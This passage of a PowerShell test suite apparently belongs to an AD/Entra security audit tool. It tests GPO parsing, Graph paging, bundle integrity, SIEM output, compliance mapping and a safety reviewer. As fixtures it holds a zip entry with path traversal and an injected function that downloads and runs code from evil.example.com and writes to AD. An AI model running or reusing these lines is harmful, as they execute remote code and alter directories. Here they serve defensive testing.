<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
  <Task clsid="{2DEECB1C-261F-4e13-9B21-16FB83BC03BD}" name="Legacy" uid="{1}"><Properties action="C" name="Legacy" appName="\\fs01\old\run.exe" args=""/></Task>
  <TaskV2 clsid="{D8896631-B747-47a7-84A6-C155337F3BC8}" name="Inventory" uid="{2}"><Properties action="C" name="Inventory" runAs="NT AUTHORITY\System"><Task version="1.2"><Actions Context="Author"><Exec><Command>\\fs01\inv\agent.exe</Command><Arguments>/scan</Arguments></Exec></Actions></Task></Properties></TaskV2>
</ScheduledTasks>
'@)
[System.IO.File]::WriteAllText((Join-Path $gd 'Machine\Preferences\Groups\Groups.xml'), @'
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" uid="{3}"><Properties action="U" groupSid="S-1-5-32-544" groupName="Administrators (built-in)"><Members><Member name="CORP\Domain Users" action="ADD" sid="S-1-5-21-1-2-3-513"/><Member name="CORP\Old" action="REMOVE" sid="S-1-5-21-1-2-3-1500"/></Members></Properties></Group>
</Groups>
'@)
[System.IO.File]::WriteAllText((Join-Path $gd 'MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'), "[Unicode]`r`nUnicode=yes`r`n[Group Membership]`r`n*S-1-5-32-555__Memberof =`r`n*S-1-5-32-555__Members = *S-1-5-11`r`n*S-1-5-21-1-2-3-1106__Memberof = *S-1-5-32-544`r`n", $u16)
$px = New-Object System.Collections.Generic.List[object]; $pg = New-Object System.Collections.Generic.List[object]
Read-GpoExtras -Dir $gd -Guid '{G}' -Name 'Test GPO' -Exec $px -Groups $pg
$cmds = @($px | ForEach-Object { $_.command })
Assert-True ($cmds -contains '\\fs01\it$\boot.cmd' -and $cmds -contains '\\fs01\old\run.exe' -and $cmds -contains '\\fs01\inv\agent.exe' -and $cmds.Count -eq 3) "GPO parser: startup script (UTF-16), old and V2 scheduled tasks (got $($cmds -join ' | '))"
Assert-True (@($px | Where-Object { $_.kind -eq "scheduled task 'Inventory'" }).Count -eq 1) 'GPO parser: V2 task keeps its name'
$pairs = @($pg | ForEach-Object { "$($_.group)<-$($_.member)" })
Assert-True ($pairs -contains 'S-1-5-32-544<-S-1-5-21-1-2-3-513' -and $pairs -contains 'S-1-5-32-555<-S-1-5-11' -and $pairs -contains 'S-1-5-32-544<-S-1-5-21-1-2-3-1106' -and $pairs.Count -eq 3) "GPO parser: Groups.xml ADD only, Restricted Groups Members and Memberof (got $($pairs -join ' | '))"
Remove-Item Function:\Read-GpoExtras, Function:\ConvertFrom-IniText

# ------------------------------------------------------------ Entra collector: Get-Graph
# Pulled out of the collector and run against a fake Graph: no tenant needed.
Write-Host "[graph paging]"
$ast = [System.Management.Automation.Language.Parser]::ParseFile((Join-Path $root 'Collect-EntraSnapshot.ps1'), [ref]$null, [ref]$null)
$ggDef = $ast.Find({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq 'Get-Graph' }, $true).Extent.Text
. ([scriptblock]::Create($ggDef))
$script:FakeGraph = @{
    'https://graph.microsoft.com/v1.0/empty'      = [PSCustomObject]@{ '@odata.context' = 'x'; value = @() }
    'https://graph.microsoft.com/v1.0/paged'      = [PSCustomObject]@{ value = @([PSCustomObject]@{ id = 1 }); '@odata.nextLink' = 'https://graph.microsoft.com/v1.0/paged2' }
    'https://graph.microsoft.com/v1.0/paged2'     = [PSCustomObject]@{ value = @([PSCustomObject]@{ id = 2 }) }
    'https://graph.microsoft.com/v1.0/singleton'  = [PSCustomObject]@{ id = 'policy'; isEnabled = $true }
}
function Invoke-MgGraphRequest { param($Method, $Uri, $OutputType) $script:FakeGraph[$Uri] }
Assert-True (@(Get-Graph 'empty' -All | Where-Object { $_ }).Count -eq 0) 'Get-Graph: an empty collection comes back empty, not as the envelope'
Assert-True ((@(Get-Graph 'paged' -All) | ForEach-Object { $_.id }) -join ',' -eq '1,2') 'Get-Graph: follows nextLink'
Assert-True ((Get-Graph 'singleton').id -eq 'policy') 'Get-Graph: a single object is returned as is'
Remove-Item Function:\Invoke-MgGraphRequest, Function:\Get-Graph

# ------------------------------------------------------------ zip bundle
Write-Host "[bundle]"
. (Join-Path $root 'lib\Bundle.ps1')
$tempBefore = @(Get-ChildItem -LiteralPath ([System.IO.Path]::GetTempPath()) -Directory -Filter 'idwolf_bundle_*' -ErrorAction SilentlyContinue).Count
$bz = New-IDWolfBundle -Snapshot (Join-Path $tmp 'demo.json') -PasswordQuality (Join-Path $root 'examples\passwordquality.example.json') -OutFile (Join-Path $tmp 'bundle.zip')
$bzCsv = Join-Path $tmp 'bundle.csv'
& (Join-Path $root 'IDWolf.ps1') -Snapshot $bz -OutHtml (Join-Path $tmp 'bundle.html') -OutCsv $bzCsv -SkipLLM 6>&1 2>&1 | Out-Null
Assert-True ((Test-Path $bzCsv) -and @(Import-Csv $bzCsv).Count -eq 173) "zip with snapshot + password quality analyzes like the two files (173 findings, got $(if (Test-Path $bzCsv) { @(Import-Csv $bzCsv).Count }))"
$tempAfter = @(Get-ChildItem -LiteralPath ([System.IO.Path]::GetTempPath()) -Directory -Filter 'idwolf_bundle_*' -ErrorAction SilentlyContinue).Count
Assert-True ($tempAfter -eq $tempBefore) 'extracted bundle removed from TEMP after the analysis'
# A file changed inside the zip no longer matches the manifest.
Add-Type -AssemblyName System.IO.Compression, System.IO.Compression.FileSystem
$bad = Join-Path $tmp 'bad.zip'; Copy-Item $bz $bad
$za = [System.IO.Compression.ZipFile]::Open($bad, [System.IO.Compression.ZipArchiveMode]::Update)
$za.GetEntry('snapshot.json').Delete()
$sw = New-Object System.IO.StreamWriter($za.CreateEntry('snapshot.json').Open()); $sw.Write('{"meta":{}}'); $sw.Dispose(); $za.Dispose()
$badMsg = ''; try { Expand-IDWolfBundle -Path $bad | Out-Null } catch { $badMsg = $_.Exception.Message }
Assert-True ($badMsg -match "doesn't match its hash") "damaged bundle refused: $badMsg"
$notOurs = Join-Path $tmp 'other.zip'
$za = [System.IO.Compression.ZipFile]::Open($notOurs, [System.IO.Compression.ZipArchiveMode]::Create)
$sw = New-Object System.IO.StreamWriter($za.CreateEntry('..\..\evil.txt').Open()); $sw.Write('x'); $sw.Dispose(); $za.Dispose()
$noMsg = ''; try { Expand-IDWolfBundle -Path $notOurs | Out-Null } catch { $noMsg = $_.Exception.Message }
Assert-True ($noMsg -match 'not an IDWolf bundle' -and -not (Test-Path (Join-Path $tmp 'evil.txt'))) 'zip without a snapshot refused, its entries never extracted'
Assert-True (@(Get-ChildItem -LiteralPath ([System.IO.Path]::GetTempPath()) -Directory -Filter 'idwolf_bundle_*' -ErrorAction SilentlyContinue).Count -eq $tempBefore) 'refused bundles leave nothing in TEMP'

# ------------------------------------------------------------ SIEM JSON Lines
Write-Host "[siem]"
$jl = Join-Path $tmp 'demo.jsonl'
& (Join-Path $root 'IDWolf.ps1') -Snapshot (Join-Path $tmp 'demo.json') -OutHtml (Join-Path $tmp 'jl.html') -OutJson $jl -SkipLLM 6>&1 2>&1 | Out-Null
$jlRows = @([System.IO.File]::ReadAllLines($jl) | Where-Object { $_ } | ForEach-Object { $_ | ConvertFrom-Json })
$jlFind = @($jlRows | Where-Object { $_.event_type -eq 'finding' })
$jlSum = @($jlRows | Where-Object { $_.event_type -eq 'summary' })
Assert-True ($jlFind.Count -eq 165 -and $jlSum.Count -eq 1) "jsonl: 165 findings + 1 summary (got $($jlFind.Count) + $($jlSum.Count))"
Assert-True ($jlSum[0].critical -eq 20 -and $jlSum[0].findings -eq 165 -and $jlSum[0].score -ge 0 -and $jlSum[0].domain -eq 'moosebank.local') 'jsonl summary: counts, score, domain'
Assert-True (@($jlFind | Where-Object { $_.finding_id -notmatch '^[0-9a-f]{16}$' -or $_.severity_score -lt 1 }).Count -eq 0) 'jsonl: every finding has a finding_id and a severity_score'
Assert-True (@($jlFind | ForEach-Object { $_.finding_id } | Select-Object -Unique).Count -eq $jlFind.Count) 'jsonl: finding_id unique within a run'
Assert-True ((Get-FindingId 'x_check' 'Bob') -eq (Get-FindingId 'X_CHECK' 'bob')) 'finding_id ignores case, so it survives renames in case only'
$ejl = Join-Path $tmp 'entra.jsonl'
& (Join-Path $root 'IDWolf.ps1') -Snapshot (Join-Path $tmp 'entra.json') -OutHtml (Join-Path $tmp 'ejl.html') -OutJson $ejl -SkipLLM 6>&1 2>&1 | Out-Null
$ejlRows = @([System.IO.File]::ReadAllLines($ejl) | Where-Object { $_ } | ForEach-Object { $_ | ConvertFrom-Json })
Assert-True (@($ejlRows | Where-Object { $_.source_kind -ne 'entra' -or -not $_.domain -or -not $_.tenant_id }).Count -eq 0) 'jsonl entra: tenant name and id on every line'
# Second run against the first: same findings, all persisting, none resolved.
$jl2 = Join-Path $tmp 'demo2.jsonl'
& (Join-Path $root 'IDWolf.ps1') -Snapshot (Join-Path $tmp 'demo.json') -OutHtml (Join-Path $tmp 'jl2.html') -OutJson $jl2 -CompareTo (Join-Path $tmp 'jl.csv') -SkipLLM 6>&1 2>&1 | Out-Null
$jl2Rows = @([System.IO.File]::ReadAllLines($jl2) | Where-Object { $_ } | ForEach-Object { $_ | ConvertFrom-Json })
Assert-True (@($jl2Rows | Where-Object { $_.event_type -eq 'finding' -and $_.status -ne 'persisting' }).Count -eq 0 -and @($jl2Rows | Where-Object { $_.event_type -eq 'summary' })[0].new -eq 0) 'jsonl with -CompareTo: unchanged run is all persisting'
# Same snapshot, two separate processes: the same bytes. PS 7 randomizes hashtable order per process.
$detExe = (Get-Process -Id $PID).Path
$detOut = foreach ($i in 1, 2) {
    $c = Join-Path $tmp "det$i.csv"; $j = Join-Path $tmp "det$i.jsonl"
    & $detExe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $root 'IDWolf.ps1') -Snapshot (Join-Path $tmp 'demo.json') -OutHtml (Join-Path $tmp "det$i.html") -OutCsv $c -OutJson $j -AiDryRun (Join-Path $tmp "det$i.txt") 6>&1 2>&1 | Out-Null
    [System.IO.File]::ReadAllText($c) + [System.IO.File]::ReadAllText($j) + [System.IO.File]::ReadAllText((Join-Path $tmp "det$i.txt"))
}
Assert-True ($detOut[0].Length -gt 1000 -and $detOut[0] -eq $detOut[1]) 'two processes on the same snapshot write identical CSV, JSON Lines and AI prompt'
$sorted = @(Sort-FindingsStable -Catalog $script:CheckCatalog -Findings @([PSCustomObject]@{ Type = 'spn_account_rc4'; Object = 'b' }, [PSCustomObject]@{ Type = 'krbtgt_password_old'; Object = 'z' }, [PSCustomObject]@{ Type = 'spn_account_rc4'; Object = 'a' }))
Assert-True ((($sorted | ForEach-Object { "$($_.Type):$($_.Object)" }) -join ',') -eq 'krbtgt_password_old:z,spn_account_rc4:a,spn_account_rc4:b') 'findings sorted by catalog position, then object'

# ------------------------------------------------------------ regulatory mapping
Write-Host "[compliance]"
$allTypes = @($script:CheckCatalog.Keys) + @($script:EntraCheckCatalog.Keys)
$unmapped = @($allTypes | Where-Object { $c = Get-CheckControls $_; foreach ($fw in 'NIS2', 'ISO27001', 'DORA', 'GDPR') { if (-not @($c | Where-Object { $_.StartsWith("$fw ") }).Count) { return $true } }; $false })
Assert-True ($unmapped.Count -eq 0) "every AD and Entra check maps to NIS2, ISO 27001, DORA and GDPR (unmapped: $($unmapped -join ', '))"
foreach ($pair in @(
        @('dcsync_rights', 'ISO27001 A.8.2'), @('dcsync_rights', 'NIS2 21(2)(i)'), @('kerberos_rc4_allowed', 'NIS2 21(2)(h)'), @('kerberos_rc4_allowed', 'ISO27001 A.8.24'),
        @('ad_backup_overdue', 'ISO27001 A.8.13'), @('ad_backup_overdue', 'DORA 12(1)'), @('ad_backup_overdue', 'GDPR 32(1)(c)'), @('audit_policy_insufficient', 'NIS2 21(2)(b)'),
        @('audit_policy_insufficient', 'DORA 10(1)'), @('point_and_print_unsafe', 'ISO27001 A.8.8'), @('entra_admins_without_mfa', 'NIS2 21(2)(j)'), @('entra_admins_without_mfa', 'ISO27001 A.8.5'))) {
    Assert-True ((Get-CheckControls $pair[0]) -contains $pair[1]) "$($pair[0]) maps to $($pair[1])"
}
Assert-True (-not ((Get-CheckControls 'password_in_description') -contains 'ISO27001 A.8.2') -and -not ((Get-CheckControls 'entra_risky_delegated_grant') -contains 'NIS2 21(2)(j)')) 'no accidental theme from a word inside another (description / risky)'
$cov = @(Get-ComplianceCoverage -Catalog $script:CheckCatalog -Findings $r.Findings -NotEvaluated $r.NotEvaluated)
Assert-True ($cov.Count -eq 31 -and @($cov | Where-Object { $_.Framework -eq 'ISO27001' -and $_.Control -eq 'A.8.2' })[0].Status -eq 'Gaps found') 'coverage: 31 controls, privileged access gaps on the demo'
$covNe = @(Get-ComplianceCoverage -Catalog $script:CheckCatalog -Findings @() -NotEvaluated @($script:CheckCatalog.Keys | ForEach-Object { [PSCustomObject]@{ Type = $_ } }))
Assert-True (@($covNe | Where-Object { $_.Status -notin 'Not evaluated', 'No check' }).Count -eq 0) 'coverage: nothing evaluated reads as Not evaluated, never as clean'
# No AD check is about MFA: the AD report must say so, not count NIS2 (j) as clean.
Assert-True (@($cov | Where-Object { $_.Control -eq '21(2)(j)' })[0].Status -eq 'No check') 'coverage: a control with no AD check says No check'
Assert-True ((Format-CheckControls 'dcsync_rights') -eq 'NIS2 21(2)(i); ISO27001 A.5.15, A.5.18, A.8.2; DORA 9(4)(c); GDPR 32(1)(b)') "per-check controls text (got $(Format-CheckControls 'dcsync_rights'))"
$jlHtml = [System.IO.File]::ReadAllText((Join-Path $tmp 'jl.html'))
Assert-True ($jlHtml -match 'Regulatory mapping' -and $jlHtml -match 'Regulatory controls\.' -and $jlHtml -match 'Legislative Decree 138/2024') 'AD report has the regulatory mapping and per-check controls'
Assert-True ([System.IO.File]::ReadAllText((Join-Path $tmp 'ejl.html')) -match 'Regulatory mapping') 'Entra report has the regulatory mapping'
Assert-True (@($jlFind | Where-Object { @($_.controls).Count -eq 0 }).Count -eq 0 -and @(@($jlFind | Where-Object { $_.check -eq 'dcsync_rights' })[0].controls) -contains 'ISO27001 A.8.2') 'jsonl: every finding carries its controls'
$jlCsv = @(Import-Csv (Join-Path $tmp 'jl.csv'))
Assert-True (@($jlCsv | Where-Object { -not $_.Controls }).Count -eq 0) 'csv: Controls column filled'

# ------------------------------------------------------------ safety review
Write-Host "[safety]"
$safetyOut = & (Join-Path $root 'Test-IDWolfSafety.ps1') -Quiet 6>&1 2>&1 | Out-String
Assert-True ($LASTEXITCODE -eq 0) "safety review passes on the shipped code: $($safetyOut.Trim())"
# The review must catch code that writes to AD, downloads, or hides what it runs.
$tamper = Join-Path $tmp 'tampered'; New-Item -ItemType Directory -Force (Join-Path $tamper 'lib') | Out-Null
Copy-Item (Join-Path $root '*.ps1') $tamper; Copy-Item (Join-Path $root 'lib\*.ps1') (Join-Path $tamper 'lib')
Add-Content (Join-Path $tamper 'lib\Common.ps1') "`nfunction Invoke-Helper { Set-ADUser -Identity x -Description y; iex (New-Object Net.WebClient).DownloadString('http://evil.example.com/p'); Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/v1.0/users' }"
$tamperOut = & (Join-Path $tamper 'Test-IDWolfSafety.ps1') -Quiet 6>&1 2>&1 | Out-String
$tamperExit = $LASTEXITCODE
Assert-True ($tamperExit -eq 1 -and $tamperOut -match 'Set-ADUser changes the directory' -and $tamperOut -match 'iex is not allowed' -and $tamperOut -match 'evil\.example\.com' -and $tamperOut -match 'not a GET') 'safety review catches an AD write, iex, a download and a Graph POST'

Remove-Item -Recurse -Force $tmp
Write-Host ""
if ($script:Failures -gt 0) { Write-Host "$script:Failures FAILED, $script:Passed passed" -ForegroundColor Red; exit 1 }
Write-Host "All $script:Passed assertions passed" -ForegroundColor Green
